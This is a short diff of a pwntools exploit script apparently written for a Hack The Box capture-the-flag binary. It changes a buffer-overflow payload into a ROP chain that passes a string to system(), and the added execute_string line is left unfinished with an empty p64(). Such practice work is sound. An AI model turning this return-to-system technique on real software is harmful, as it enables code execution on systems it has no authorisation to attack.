@@ -8,6 +8,7 @@ executable = '/home/kali/Downloads/htb-console'
 
 padding_length_flag = 24
 system_call = p64(0x401381)
+execute_string = p64()
 
 
 elf = context.binary = ELF(executable)
@@ -34,7 +35,7 @@ io.sendlineafter('>>', 'flag')
 
 
 padding = b'A' * padding_length
-payload = padding + system_address
+payload = padding + POP_RDI + execute_string + system_address
 
 
 log.info('Send Payload')
